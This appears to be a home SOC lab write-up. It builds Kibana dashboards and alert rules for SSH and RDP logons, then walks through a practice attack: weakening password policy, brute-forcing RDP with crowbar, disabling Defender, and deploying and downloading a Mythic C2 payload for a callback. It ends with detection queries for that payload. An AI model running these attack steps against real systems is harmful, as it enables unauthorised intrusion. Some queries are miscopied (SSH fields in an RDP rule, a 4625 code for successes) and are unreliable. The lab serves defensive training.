4) Have better Passwords (15 or more characters, containg upper,lowercase, numbers, and special characters.

5) Don't use default accounts (Disable default accounts coming from systems and make new credentials with complex passwords and other security features)

## Creating Alerts and Dashboards for Windows Server

We will be looking for brute force attacks. The Event ID for a failed login attemopt is 4625. This event is recorded in the security log whenever a user fails to log on to a Windows system, capuring key details such as the username, source IP address, and the reason for the failure.

_Creating Failed logon Dashbaord_
- We can now have our dashboard setup to include just these events by entering 'event.code: 4625'
- We will also add 'source.ip' and 'user.name'

<img width="1218" height="739" alt="4_eventcodeescontaining4625" src="https://github.com/user-attachments/assets/4e47c4c4-ca53-4957-8b3c-a9d1f6da9ff3" />

- Enter save and give it a name

<img width="1952" height="824" alt="5_saverdpfailedactivity" src="https://github.com/user-attachments/assets/c9067a02-e9f1-4d2a-aeb0-a2d344398b9b" />

- We see for this attempt on top, if we expand the message field, and view Logon Type, we have 3, which means it is a network-based authentication.
- Let's test the log by trying to RDP into the Windows server. Let's falsley type in the password so we can get a failed message.

<img width="446" height="493" alt="7_failed_RDP" src="https://github.com/user-attachments/assets/b5f4963c-98d1-4738-9e48-4fbcbb49f451" />

- Once failed, go back to dashbard and refresh and filter down to the last minute. We have our failed attempt showing here. Also, if you expand the message you can confirm it iss a logon type 3.

<img width="1218" height="461" alt="8_Failed_attempt_dashboard" src="https://github.com/user-attachments/assets/20d4a092-2fc2-452a-a5ab-f5613c632357" />

_Create successful logon Dashboard_

- We want to create a search Threshhold Rule from the dashboard, upper left.
- Set the definition like so:

<img width="497" height="833" alt="9_set_definition" src="https://github.com/user-attachments/assets/7ed2c6fd-e433-49eb-96b0-db471626d93d" />

- add name and select 'create rule'  (can skip actions)

<img width="480" height="829" alt="10_create_rule" src="https://github.com/user-attachments/assets/93025016-22de-41e9-94e6-d996b4d97188" />

_Let's create a new rule for our alert!_
-Go to Security under hamburger icon, click Rules.
- Click on add new rule.
- Select Threshold rule

1) Define Rule
- enter in our query we used in previous section: system.auth.ssh.event : * and agent.name: MYSOCENV-WIN and system.auth.ssh.event: Failed and user.name: "root" 
- add user.name: root at the end to include that.
- Group by both user.name and source.ip
- Add source.ip and username fields as required fields.

2) About Rule
- For the name, give it something obvious like "MYSOC-SSH-Brute-Force-Attempt"
- Description can be something like: This rule detects failed authentications towards the account "root"
- Let's make the Severity medium
- can keep Default risk score as 50
- Under Advanced Settings, we could choose to enter any Referance URL's if we see anything online or cybernews saying there are attacks coming from a certain source. We will leave blank for this.
- Select 'Source.ip for the Custom Highlighted field.
- Select continue

3) Schedule Rule
- Can set to run ebery 5 minutes and look-back time can be 5 minutes.

4) Rule actions
- leave as is.
- Create
- We have our rule

<img width="1031" height="754" alt="11_BruteforceRulecreated" src="https://github.com/user-attachments/assets/d0f9b392-3a87-4ecf-833b-0a6df341043a" />

_Now we will create a new rule for our RDP sessions_

- Create new rule with the same template as before
1) Define Rule
- enter our query from before, and then add user.name: Administrator instead: system.auth.ssh.event : * and agent.name: MYSOCENV-WIN and system.auth.ssh.event: Failed and user.name: Administrator
- add user.name: root at the end to include that.
- Group by both user.name and source.ip
- Add source.ip and username fields as required fields.

  <img width="619" height="794" alt="12_RDP_Rulecreated" src="https://github.com/user-attachments/assets/08236d5d-b6c8-44d4-968d-876307588af0" />

2) About Rule
- Add name, include RDP in there to identify it is alerting for RDP sessions.
- Set description
- set severity medium
- leave default risk score

3) Schedule Rule
- Have it run every minute, and have addmitional look-back time be 5 minutes.

- Create and enable rule

<img width="1034" height="753" alt="13_RDP_Rulecreated" src="https://github.com/user-attachments/assets/243545f2-ee5e-41c2-a700-cd39a200c06d" />

_Later, we can test these rules_

<img width="1897" height="651" alt="14_DetectionRules" src="https://github.com/user-attachments/assets/f2c17616-5321-4d20-83c7-f5003a215664" />

- We can now check our alerts and see if we have any coming from our rules. 

_Uh-oh_. We are getting and error from the Security > Rules menu: 
Error: Forbidden     at Fetch.fetchResponse (http://149.28.117.193:5601/80a75d1ae44e/bundles/core/core.entry.js:1:244683)     at async fetch (http://149.28.117.193:5601/80a75d1ae44e/bundles/core/core.entry.js:1:248484)     at async http://149.28.117.193:5601/80a75d1ae44e/bundles/core/core.entry.js:1:242716     at async http://149.28.117.193:5601/80a75d1ae44e/bundles/core/core.entry.js:1:242673

- The "Forbidden" error in Elastic/Kibana is an HTTP 403 response, meaning the system is rejecting the request due to insufficient permissions. It's not a configuration bug in my detection rule itself — it's an authorization/privilege issue preventing the rule from executing or writing alerts.

- So after asking about this issue in the Elasticsearch Forum (I recommend turning to that if you are ever stuck in Elasticsearch or Kibana), this is a bug current to version 9.0 to 9.3.3
- I am current to 9.2, so I will have to update my ElasticSearch system to either version 9.3.4, or version 9.4. I will have to wait until; they are available.
- I will be following this guide to update:
https://www.elastic.co/docs/deploy-manage/upgrade/deployment-or-cluster/self-managed

<img width="774" height="777" alt="16_Update_ElasticsearchClusterGuide" src="https://github.com/user-attachments/assets/e7db4026-3614-41c4-9597-4bfeb7909f35" />

## Create a Dashboard for RDP Activity

- Let's Select our saved Dashboard for RDP failed Activity

<img width="1333" height="826" alt="1_Review_Our_dashboard_selectsavedone" src="https://github.com/user-attachments/assets/925bdbf4-52b2-4cb9-aa84-802760e81e91" />

- Copy that event code: 4625 in the search, and enter it in our notepad from before. Let's make a query to include that event id with our agent name.

<img width="508" height="199" alt="2_copy_code" src="https://github.com/user-attachments/assets/1baed7a8-c5ac-4306-832a-9858b9001778" />

- Copy that code, go to maps, and past in that query
- Add a layer and select Chlorapleth
- Enter in the information like so:

  <img width="1338" height="911" alt="3_Make_map" src="https://github.com/user-attachments/assets/788f4554-b1b3-4d62-bb4f-de0c6f3f405d" />

_There are 34,115 failed attemps coming from Romnia in the last 7 days.... wow!_

- Click on Continue, then save on top right (we want to save to Library).
- We wan to add this new map to our existing Dashboard (MYSOC-Authentication-Activity) where we made the other two maps (SSH failed and successfuly activity)
- If you cannot add it from there, you may need to go to that Dashboard first, select add, select Library, and choose our new map from there.
- feel free to toggle and adjust the maps to fit neatly in the dashboard.

### Creating a 4th map to show successful RDP conneciton attempts

_If we look up what even ID shows a successful login to a computer, a simple internet search can tell us._

- Windows Event ID 4624 signifies a successful logon to a computer. Generated in the Security log, this event records essential forensic data including the username, domain, logon type, and source IP address. It is crucial for monitoring unauthorized access, lateral movement, and insider threats.
- Let's go back to our Discover screen in Elastic, and add event.code: 4624 to the search

<img width="1332" height="597" alt="4" src="https://github.com/user-attachments/assets/d6a75c82-ab47-47e3-8da0-08c9739d2fa9" />

- Notice our logon Type is 5, which is a service startup logon.

<img width="1054" height="518" alt="5" src="https://github.com/user-attachments/assets/785ddfc5-91de-481c-87db-e312d13809c4" />
<img width="614" height="719" alt="6" src="https://github.com/user-attachments/assets/fc73ae73-3d16-4504-8654-cc52f9950636" />

- We will need to use that field, winlog.event_data.LogonType

<img width="638" height="598" alt="7_windlogeventlogontype" src="https://github.com/user-attachments/assets/eabc4c12-5bfd-4b7c-b372-882f989eeb53" />

- Referring to our table, we will want codes 7 and 10. The quwey will be:
- event.code: 4624 and (winlog.event_data.LogonType: 10 or winlog.event_data.LogonType: 7)


<img width="1070" height="493" alt="Screenshot 2026-04-16 174252" src="https://github.com/user-attachments/assets/587a5f43-6d96-434e-8a45-0b72c7a8cfad" />

- Save this Discover as 'RDP Sucessful Activity'

_Add the new map in our Dashboard_

Back in our Dashboard, Click on the 3 dots 
on our RDP failed Authentication map, and select Duplicate.
- Edit the duplicate map
- Update our query on the top by pasting our newer query
- See the map update with data
- Select Save and return
- Change the name to something like 'RDP Successful Authentications' and select apply.

<img width="1333" height="866" alt="Screenshot 2026-04-16 175041" src="https://github.com/user-attachments/assets/e3ce1e4a-1b67-4509-ab2c-e317f09ad94f" />

- We have our Dashboard
- If we toggle to the last 15 minutes, we should not have much, if not anything for failed attempts. Except for me, I have one failed RDP authentication. We do see some activity for failed RDP connections, and 36 failed SSH connections from Romania. 

<img width="1609" height="731" alt="Screenshot 2026-04-16 175525" src="https://github.com/user-attachments/assets/93f8e6c6-cbff-45cf-ae61-755b28e14a99" />

_Improving our visuals for the dashboard_
- On Dash board, select add, and select Visualization.
- Add our first query used, system.auth.ssh.event: * and agent.name: MYSOCENV-Linux and system.auth.ssh.event: Failed
- Add a timestamp, source.ip
- on top right, select table in dropdown instead of bar chart
- We have our source ip column and timestamp column. Make the timestamp appear first.
- include user.name and sorce.geo.country_name
- Afer looking at table, the timestamp just create more noise than needed, so let's remove that from our rows in the table in the right to remove it.
- click on the user.name and make the number of values to be 10, and, take off the group remaining values as 'other' option.
- Do the same for Source.ip as well.

<img width="344" height="763" alt="Screenshot 2026-04-16 181955" src="https://github.com/user-attachments/assets/1ece63a0-0dc6-4957-a136-0b56aa187eba" />

- set our Count of records as Sort Decending
- Our dashbopard is setup. Now let's Save and return.

<img width="1912" height="887" alt="Screenshot 2026-04-16 182236" src="https://github.com/user-attachments/assets/daadefa9-fc3f-4b1b-82ac-bd4095eef3c5" />

- In our Dashboard, click on settings for the new view, and give it a name like 'SSH Failed Activity [Table]'. Click Apply.
- Let's put that table between our SSH Maps (failed and successful)

<img width="1904" height="865" alt="Screenshot 2026-04-16 182825" src="https://github.com/user-attachments/assets/12352c9d-1ac7-4c05-9bfa-27dbb5f64aee" />

- Now, let's add another table for our Successes.
- Duplicate the table
- Change the name to 'SSH Successful Authentications [Table] '
- Adjust the query for this new table by clicking on it's settings.
- Select Edit next to the query shown. Yopu might have to also click on 'Edit in Lense'
- In query on top bar, change from Failed to Accepted at the end.

<img width="1330" height="543" alt="Screenshot 2026-04-16 183813" src="https://github.com/user-attachments/assets/7fc0d681-fad4-41d3-9e88-24fd8164215e" />

- Click on Save and Return. We have our tables for SSH authentications

<img width="1400" height="859" alt="Screenshot 2026-04-16 184104" src="https://github.com/user-attachments/assets/69fee723-a8c8-4aa3-b855-d21ff339aa30" />

_Now creating tables for RDP authentications_

- Duplicate one of the tables
- Give it a name like RDP failed Authentications
- Edit the query, and paste the query in the search bar FROM our notepad (event.code: 4625 and agent.name: MYSOCENV-WIN).
- Save and Return.


_Now making RDP successes_
 Duplicate the last table
- Give it a name like RDP failed Authentications
- Edit the query, and paste the query in the search bar FROM our notepad (event.code: 4625 and agent.name: MYSOCENV-WIN). Update.
- Save and Return.

_All Tables have the username, source ip, country of origin, and the number of authentication attempts._

- Select Save on top right to save our Dashboard.

**_Congratulations! We now have a Dashboard that shows global maps with their corresponding tables of failed and successful Authentications from their source of origin, with their source ip address and number of records shown._**

<img width="1909" height="906" alt="Screenshot 2026-04-16 185250" src="https://github.com/user-attachments/assets/46a24749-4e55-43cf-b79f-b65e42a8953f" />

# Establish a command and control session

## What is a Command and control?
It's where an attacker has control over a victim's computer, so they perform actions on it to complete their objective.


## Why is it important?
It is important because attackers perform actions on it to complete their objective: 
- Credential access
- Lateral movement
- Exfiltration
- Ransomware

## What are some of the tools/frameworks?

- Metasploit: The most widely used open-source penetration testing framework. allows security professionals to find, exploit, and validate vulnerabilities in systems, networks, and applications. 
It features a vast database of exploits, payload generation, and post-exploitation tools, often used to simulate attacks.

- Cobalt Strike: commonly seen in compromised environments. The industry professionals have help come up with a detection method for Cobalt Strike.

- Sliver: Sliver is an open-source, cross-platform command and control (C2) framework designed for security professionals and red teams to emulate adversary behavior. Written in Go, it generates 
dynamically compiled implants that evade detection, supporting Windows, macOS, and Linux, and is managed by BishopFox. It is known as an alternative to cobalt strike.

- MNythic: We will be using Mythic in this lab. Mythic is an open-source, cross-platform, and modular Command and Control (C2) framework designed for red teaming and authorized penetration testing. It acts as a "multiplayer" platform 
allowing multiple operators to collaborate through a web interface, managing agents that communicate with victims across various operating systems.

Next, we will be using this to create a c2 session to replicate an attack from an outside server.
Below is a diagram of our activity, maped out so we know our path and plan of attack:

<img width="749" height="1347" alt="Attack Diagram drawio" src="https://github.com/user-attachments/assets/40cefcfa-4329-40f1-bc6a-f344f361518d" />

## Setting up Mythic Server

- Install an Ubuntu Server with 2 CPU and 4 GB of Ram. Give it a name to indicate it is using MYTHIC
<img width="1505" height="864" alt="1" src="https://github.com/user-attachments/assets/906997f7-a468-4a0d-bd7b-85eb5e9e88f0" />

_let's make sure we have an attack server setup. Since it is outside of our target network, we will need it to not be on the VPC._
- In my case, I will be using Virtualbox to host my Linux Attack Server.
- You will want to install the iso file in your VMware, Vurtualbox, or whatever you are using.

_Now we can install Mythic on our Mythic Server WITHIN the network_
- Add Mythic Server with Ubunto 
- Connect to Mythic server via Powershell

<img width="1169" height="748" alt="4_SSHintoMythicUbuntuserver" src="https://github.com/user-attachments/assets/8b787a1f-bc20-46b8-be6e-cb59cd9377c1" />

- Update the repository

<img width="934" height="498" alt="5_update repository" src="https://github.com/user-attachments/assets/9aee5a8c-995b-4e3c-b391-e4ecc0bb0288" />

- Install Docker Compose
Docker Compose is an orchestration tool designed for defining and running multi-container applications. It allows you to manage a complete stack of services (such as a web server, database, and cache) as a single entity using a declarative configuration file.

- Set our Direcoty to Mythic using prompt 'CD Mythic'
- Run 'ls' to see out options in the Mythic Folder.
- Run 'install_docker_Ubuntu.sh
- You might run into an issue where the docker failed to start or even install properly.
- If so, run 'systemctl status docker' to see the status

<img width="930" height="366" alt="10_docker_status_failed" src="https://github.com/user-attachments/assets/1c3791c6-a0b1-42ad-970b-5065facc717d" />

- Mine came up as inactive (dead), in which I decided to to run the 'reinstall' command. I then ran the 'restart' command. I checked the service status again, and it was running.

- Now, run the 'make' command.
- The make command is a build automation tool in Linux used primarily to manage the compilation and installation of software. It operates by reading a configuration file, typically named Makefile, which defines the relationships between files and the commands needed to build them.

- Next, run './mythic-cli start' command in linux.
- It launches the Mythic C2 framework, bringing up all default Docker containers, including the database, server, and UI, within the Mythic directory. It is used to initialize the framework, requiring pre-installed Docker and make to compile the binary.

<img width="769" height="567" alt="13_Mythic_CLI_start_command" src="https://github.com/user-attachments/assets/63877188-9ce9-4fff-a90b-8b26b75b36a6" />

_We now want to add a new firewall group for our Mythic Server in order for it to connect to other machines in our VPC from VULTR._

-Manage Firewall under our Mythic Server

<img width="802" height="536" alt="14_update_firewall_group" src="https://github.com/user-attachments/assets/007f94de-6629-4c19-a5fa-0654f54bfc8e" />

- Add a TCP Rule for OUR personal computer, another for our Windows Server, and another for our Linux/SSH Server

<img width="1262" height="405" alt="16_add_TCP_Rule_forWindows_Linux_and_my_personal_machine" src="https://github.com/user-attachments/assets/1e6870e9-d875-4222-b6f2-a93f8d36b675" />

-Associate that new firewall group under our Mythic server, then select 'update Firewall Group'

<img width="1014" height="528" alt="17_gotoMYTHIC_Server_andadd_Firewalltoitpng" src="https://github.com/user-attachments/assets/90e38d36-7db8-4f7a-83f8-e9f622c241eb" />

_Browse to our Mythic Server URL via the ip address_

enter in the full URL of the Mythic Server using the IP address USING HTTPS, and port 7443

<img width="1298" height="640" alt="Screenshot 2026-04-18 151704" src="https://github.com/user-attachments/assets/8c8c0069-98e4-4e7b-adb3-d100ae61d2ad" />

-We can view our Mythic Login username and password using command 'cat .env' in Powershell in our Mythic Directory.

<img width="489" height="22" alt="20_MYTHIC_cat_env_tofindmythicadminpassord" src="https://github.com/user-attachments/assets/f66ba3f4-c89a-4644-8b67-daf0491cd444" />
<img width="506" height="168" alt="21_password_in_ENV_DIRECTORY" src="https://github.com/user-attachments/assets/2e13a52e-086e-4e05-b459-636a2b7b8709" />

- We are now logged into our Mythic Server

<img width="1893" height="902" alt="22_MYTHIC_Home_Page" src="https://github.com/user-attachments/assets/3f7bd609-73eb-49fe-8342-bdcbf503c2ca" />

- We can view installed services, view and add payloads, view and add and remove files, and more.

<img width="1620" height="586" alt="23_installed_services_Payloads_Mythic" src="https://github.com/user-attachments/assets/1c591170-52c6-47f2-a1b6-3ec8de2443d9" />
<img width="1803" height="322" alt="25_Files" src="https://github.com/user-attachments/assets/02c0334f-0a79-4334-91e9-244b80bd3105" />
<img width="1889" height="356" alt="24_Payloads_Mythic" src="https://github.com/user-attachments/assets/2e6e969f-9146-4af5-8800-029eef11cdda" />

_Next, we will properly setup our Mythic Server, create our Muthic Agent, and start conducting attaks on our Windows Server machine. _

_WARNING. Please use Mythic and Linux server to test and practice in a controlled environment. Run and set these up on an environment you own and have permission to tamper with. Also please make sure you are able to correct any vulnerabilities made in this lab, or wipe everything in these servers when finished. It may be wise to have a screenshot of these environments before playing with these._

## Mythic Agent Setup and performing Attack
_Again, here is our Attack Diagram we will be following:_

<img width="749" height="1347" alt="Attack Diagram drawio" src="https://github.com/user-attachments/assets/c76be57f-045c-4256-a7a6-4a5ebe53daeb" />

- Let's first setup our admin credentials in our Windows Server (target).
- Log into our Window's Server
- Let's try assigning a new password for our Administrator account (currently signed in)
- open Settings > Accounts > Sign-in options, click Password, then "Change"
- set the Password to somehting simple, like 'Fall2023!'
- You will need to enter/paste in the current password.
- It will likely tell you the password is not long or complex enough, so we need to change the password policy.
- Go to Group Policy in our Windows Server.
- Go to: Windows Settings > Security Settings > Account Policies > Password Policy > Munimum Password Length.
- Change from 14 (or whatever it is set as currently) characters to 5 (correct, this is not a secure length) and select OK/Apply.

<img width="1163" height="658" alt="1_password Policy PNG" src="https://github.com/user-attachments/assets/d6ca222e-90bc-47b2-b6a4-157afe837754" />

- Also, disable 'Password must meet complexity requirements'.

<img width="848" height="600" alt="Screenshot 2026-04-19 103958" src="https://github.com/user-attachments/assets/7ec7c509-6232-4b14-9e6a-1da92612481d" />

- Trying changing the admin password now to something simple like 'Fall2023!'. It should not accept that.
Something simple like this password is still what a lot of organizations still use, unfortunately.

_Now, let's log into our sperate, Kali Linux Virtual machine so we can try to Brute Force the Windows server, then establish an SSH connection and then discver our directory, network, accounts and more from our Windows Server. I will be launching from Virtual Box._

- OpenTerminal
- We will want to try a wordlist in order to perform a brute force attack. Please refer to the following screenshot of Kali Terminal in order to generate one. We will want to use 'rockyou.txt.gz'. To use that one, we probably need to allow permissions using the 'sudo command'.

<img width="1137" height="906" alt="3_Determinewordlist" src="https://github.com/user-attachments/assets/7fd1a536-ef70-4369-ade1-e4f34ccf4e21" />

_'head -50 rockyou.txt' will show us 50 entries of the rockyou wordlist._

- We may need 'Sudo' command in order to have permission to add a new wordlist into our home directory from rockyou.txt. see below as example.

<img width="900" height="643" alt="4_Rockyoutxtdirectory" src="https://github.com/user-attachments/assets/43832d4d-06f3-488e-b608-c54e1c51033a" />

- Run 'cat MYSOC-wordlist.txt' to view our password list.

<img width="258" height="503" alt="Screenshot 2026-04-19 114050" src="https://github.com/user-attachments/assets/eff0b1ee-786d-446d-ab3d-79aab39cf7b8" />

- then run 'nano MYSOC-wordlist.txt'
- Enter in our simple password we created (one likely to be in a word list like this; this is to proove and test our concept and attack diagram) at the bottom of the list (Fall2023!).
- cntrl X to exit and Y to save.

_Next, we will use a program called crowbar_

- Run 'sudo apt-get install -y crowbar' (if that fails saying unable to locate package crowbar, you may need to update your repositories for your Kali-Linux machine ; sudo apt-get update && sudo apt-get upgrade -y. 'sudo' apt install gnupg' will also be required.)

<img width="751" height="251" alt="Screenshot 2026-04-19 114755" src="https://github.com/user-attachments/assets/da5f581f-6a5a-4197-a8aa-358569c78087" />

- tpye in Crowbar -h to review it.

<img width="890" height="589" alt="Screenshot 2026-04-19 121248" src="https://github.com/user-attachments/assets/8b3dcbd1-6fa7-4f03-b168-3a74444eabb6" />

_We will be using crowbar to perform a brute force attack over to our Windows Server (First line in our attack diagram)._

Create a target.txt file

<img width="415" height="115" alt="Screenshot 2026-04-19 121655" src="https://github.com/user-attachments/assets/1a6f31c5-ce77-4b0c-8910-4fd907287e9e" />

- We will want to use crowbar and specify WHERE we are using it. In this case, it will be our target Windows Server machine.
- We want to use the tool, using the RDP service as an Administrator user account, using our saved worlist containing a bunch of different passwords, including the one we actually have for our Administrator password for Windows Server, and directing this login/bruteforce attack to our Windows Server using it's IP address.

<img width="629" height="64" alt="Screenshot 2026-04-19 122534" src="https://github.com/user-attachments/assets/66c642d2-8421-440e-84c3-06bff9d02de1" />

- Once you have that, hit Enter to perform the attack.

_Ope. We'll have to install an RDP software onto our Kali Linux system._

<img width="520" height="49" alt="Screenshot 2026-04-19 122922" src="https://github.com/user-attachments/assets/d4148317-f1b6-4325-bf95-27d84597dd97" />

- If you do not have it, Run the following command to install the latest version available in the Kali Linux Tools repository.
- 'sudo apt install freerdp3-x11'

<img width="1508" height="373" alt="Screenshot 2026-04-19 123250" src="https://github.com/user-attachments/assets/502526f8-ec09-42cd-b4e3-daa7fdc8874f" />

- Enter Y and hit Enter

- NOW, when we try to run crowbar again, it simply tells us it tried to connect, but not getting any results.

<img width="364" height="87" alt="Screenshot 2026-04-19 123809" src="https://github.com/user-attachments/assets/ac3281ca-9450-4ef7-abb1-2dd515948e02" />

- We should now be able to use our xfreerdp to connect to that Windows server via RDP.

<img width="644" height="36" alt="Screenshot 2026-04-19 125446" src="https://github.com/user-attachments/assets/e017cf1d-77e7-4ca4-b1f1-5b0e25b27813" />

- It will ask us if we trust the certificate above? Will select Y for yes.

_We are now RDP'd into our Windows Server target machine._

<img width="1365" height="796" alt="Screenshot 2026-04-19 125721" src="https://github.com/user-attachments/assets/0e37ac8f-d147-44fd-ba1a-f3c80d4c5586" />

**_We are now officialy fone with Phase 1 and in Phase 2 in our Attack diagram_**
_We can use the following commands to gather information: whoami, ipconfig, net user, net group._

- Open up Command prompt within our RDP session
- We will get the username we are logged in as, the network, mac address, IP information, and user accounts under the Windows Server.

- running net user administrator gives us more information about that user and login and password policies, as well as what group this username is apart of. In this case, it is apart of the Administrators group.

<img width="753" height="501" alt="Screenshot 2026-04-19 130713" src="https://github.com/user-attachments/assets/e3caacde-ec59-4d63-9299-93418e0e2630" />

**_We have Completed Phase number 2_**

_In Phase 3, we will be disabling Windows Defender_
- in the RDP session, Go to Windows Defender > Virus & Threat protection and disable everything in there, especially 'Real-time protection'.

<img width="865" height="644" alt="Screenshot 2026-04-19 131559" src="https://github.com/user-attachments/assets/b6484de6-c394-4fcb-9996-d677182dac57" />

_**Phase 3 Complete ; Beginning Phase 4, Execution**_
We will be bulding our Mythic Agent.
- Log into our Mythic web GUI from before.
- Determine what Mythic agent we will be using for Windows. Gethub has a table showing what OS's wach agent can operate for.

<img width="1386" height="922" alt="Screenshot 2026-04-19 132009" src="https://github.com/user-attachments/assets/4670b491-cc65-4249-8678-a1dbc13d024b" />

- We will be using apllo.
- You can scroll down the table to see it's capabilities as well (supporting http, smb, tcp, etc.).
- Install our mythic agent ONTO our MYTHICServer we spun up recently:

<img width="481" height="91" alt="Screenshot 2026-04-19 132628" src="https://github.com/user-attachments/assets/9573a3df-9be5-43ee-bea7-89856d57cedc" />

For some reason I had to reinstall Mythic C2 service on the Mythic server

<img width="967" height="832" alt="Screenshot 2026-04-19 134021" src="https://github.com/user-attachments/assets/87b52842-23d7-44e1-a118-6aa84021bff4" />

- After that, attempting Apollo agent install (found in Gethub: https://github.com/MythicAgents/Apollo):
- ./mythic-cli install github https://github.com/MythicAgents/Apollo.git

_Mythic Agent Installed!_

<img width="920" height="792" alt="Screenshot 2026-04-19 134326" src="https://github.com/user-attachments/assets/25120373-4a0c-4e34-bef2-682737a826ab" />
<img width="1929" height="395" alt="Screenshot 2026-04-19 134602" src="https://github.com/user-attachments/assets/e0d0274c-cd54-4e04-b680-e2fe94a2a74e" />

- Run this to install our C2 profile: ./mythic-cli install github https://github.com/MythicC2Profiles/http

- We now have our agent AND C2 profile

<img width="1237" height="317" alt="Screenshot 2026-04-19 135110" src="https://github.com/user-attachments/assets/64ceb834-793f-458a-8b0e-9626ff6be28d" />

<img width="1779" height="799" alt="Screenshot 2026-04-19 135420" src="https://github.com/user-attachments/assets/0bbf1bd5-d76a-4e47-b364-0bcb149b7cf0" />

click next

<img width="1507" height="888" alt="Screenshot 2026-04-19 135611" src="https://github.com/user-attachments/assets/6c42c2df-97c5-4042-a88b-e9ed65f1c68e" />

include profile and edit callback host to point to Mythic Server IP address. Have it use http. click next

<img width="1629" height="829" alt="Screenshot 2026-04-19 135916" src="https://github.com/user-attachments/assets/fa86302a-b2e4-405f-925a-c7aa2be804d6" />

Provide a name and description, then select Create Payload on bottom left of screen.

<img width="920" height="174" alt="Screenshot 2026-04-19 140130" src="https://github.com/user-attachments/assets/f9f9968c-e099-46ad-9963-4c2da1ba545d" />

Select Download here after payload is built

<img width="765" height="106" alt="Screenshot 2026-04-19 140415" src="https://github.com/user-attachments/assets/49eb6ac6-b8b8-40ee-a85d-4d2d80a396e1" />

- copy link address for download here instad of downloading in on our personal computer

- tpe 'wget (our_payload_URL_wejustcopied) --no-check-certificate'

- run the following to change our service host anme and directory. The license file number and your name will be different.

<img width="1186" height="302" alt="Screenshot 2026-04-19 141613" src="https://github.com/user-attachments/assets/f96290bd-cf9d-4aca-bab2-eb71a7a612f4" />

- run 'python3 -m http.server 9999'
- It will say 'Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...'

**_Now, go back to our RDP session from our external Kali-Linux machine_**

- We want to run the following (IP address will be different for YOUR Mythic Server:

<img width="1006" height="85" alt="6_Successful_InvokeWebRequest_for_payload_onto_Windows" src="https://github.com/user-attachments/assets/72e5b8d6-8d72-43bf-81f0-8b064636aa04" />

- We see have the payload now in our target Windows machine:

<img width="472" height="128" alt="We have our mythcipayloadfile" src="https://github.com/user-attachments/assets/b45d690b-95da-4984-ae45-978033be0eb4" />

- We can also confirm the payload is in Windows by running 'netstat -anob'

<img width="689" height="47" alt="Screenshot 2026-04-20 204442" src="https://github.com/user-attachments/assets/76b2a3f2-0ba8-4d0b-ab3a-01d38fb72be0" />

_Go back to our Mythic Dashbaord, and click on the phone icon:_

<img width="1885" height="288" alt="Screenshot 2026-04-20 204806" src="https://github.com/user-attachments/assets/e7258d39-253f-4bc1-adab-307b0fc298d7" />

- We can now run commands FROM our Mythic Dashboard Callback here to run any command line essentially that we want, even downloading files, like this:

<img width="1877" height="907" alt="Screenshot 2026-04-20 210953" src="https://github.com/user-attachments/assets/0bed4dac-500e-4e86-8fb6-d4729b91d347" />


We now have our callback from our target Windows Server

## Finishing our Kibana alerts and Dashboard (Create an alert and dashboard based on the telemtry generated by Mythic)

### Create alert for Mythic activity

- Click new on Dashboard in Elastic

<img width="1911" height="915" alt="1_new_dashboard" src="https://github.com/user-attachments/assets/5c278cd1-d137-41ee-ab45-bdc67125f417" />

- type in name of our payload we renamed to (mine is svchost-MYSOC)

<img width="1268" height="622" alt="2_svchost_activity" src="https://github.com/user-attachments/assets/59e73824-559b-4cec-b548-2b37c50d83bf" />

- We can see our event from our payload, then expand, and view event code is 11, and that under message field, we see the target filename and it's location (where it was downloaded to when we were placing it from our Attacker Kali Linux). We can also see the image used was Powershell.

<img width="1268" height="727" alt="2_svchostevent" src="https://github.com/user-attachments/assets/e943d050-4c5a-4937-9bf6-96f83adb28c0" />
<img width="433" height="309" alt="Screenshot 2026-04-21 192009" src="https://github.com/user-attachments/assets/eb07b423-818a-4d90-86e3-c08c2cf2b173" />

Now let's add 'event.code: 1' to our search query.. Expand the event we get, and go to our hash. Copy our hash for the winlog.event.

<img width="999" height="680" alt="Screenshot 2026-04-21 192531" src="https://github.com/user-attachments/assets/d0113359-587e-459e-aa63-7ff6f3eaef6a" />

- Let's also note our original filename is Apollo. So Kibana is capable of helping us determine even more what a certain, random filename is.

<img width="739" height="600" alt="Screenshot 2026-04-21 193007" src="https://github.com/user-attachments/assets/189fb9ed-a448-4941-8085-871da8023b6a" />

-Let's go to Virus Total website:
_VirusTotal is a free online service, owned by Google subsidiary Chronicle, that analyzes files, URLs, domains, and IP addresses for malicious content. It aggregates results from over 70 antivirus scanners and domain blocklisting services, providing a comprehensive check to detect malware, phishing, and false positives._

- Let's use this search query:
- svchost-MYSOC.exe and event.code: 1 and winlog.event_data.Hashes: *SHA256=06B89F39F7B992E088AF0881F497573CD3ED2A724EEFAE8CEEF4BA2AFB23E7D3,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744*

- <img width="994" height="682" alt="Screenshot 2026-04-21 194755" src="https://github.com/user-attachments/assets/7ff99337-f499-4733-8d96-45dd68aad968" />

- Let's also then use this query to detect Apollo.exe activity:
- svchost-MYSOC.exe and event.code: 1 and winlog.event_data.Hashes: *SHA256=06B89F39F7B992E088AF0881F497573CD3ED2A724EEFAE8CEEF4BA2AFB23E7D3* or winlog.event_data.OriginalFileName:Apollo.exe
<img width="1633" height="768" alt="image" src="https://github.com/user-attachments/assets/5e3e5f3a-5b3e-4532-84fb-30ac1cdeddf5" />

- It has an event ID 7, which means an image was loaded.
- Now, include perentheses like here:
- svchost-MYSOC.exe and event.code: 1 and (winlog.event_data.Hashes: *SHA256=06B89F39F7B992E088AF0881F497573CD3ED2A724EEFAE8CEEF4BA2AFB23E7D3* or winlog.event_data.OriginalFileName:Apollo.exe)

- We NOW should only have one event id, which should only be looking for our Event ID 1, which means a process was created.

- NOW, let's reduve our query by getting rid of our svchost-MYSOC.exe and:
- event.code: 1 and (winlog.event_data.Hashes: event.code: 1 and (winlog.event_data.Hashes: *SHA256=06B89F39F7B992E088AF0881F497573CD3ED2A724EEFAE8CEEF4BA2AFB23E7D3* or winlog.event_data.OriginalFileName:Apollo.exe)
- Let's save our query by putting in our saved notepad for now.

<img width="732" height="471" alt="Screenshot 2026-04-21 195826" src="https://github.com/user-attachments/assets/508e58fb-1338-4599-b2f8-d25878133391" />

- Save our Search (name like 'Mythic-Apollo-Process-Create')
- Name the tab that as well

### Create a new rule under Security
- Use a custom query

We want the following fields for our rule:
- host.hostname
- message
- winlog.event_data.CommandLine
- winlog.event_data.Image
- winlog.event_data.ParentCommandLine
- winlog.event_data.ParentImage
- winlog.event_data.ProcessGuid
- winlog.event_data.User

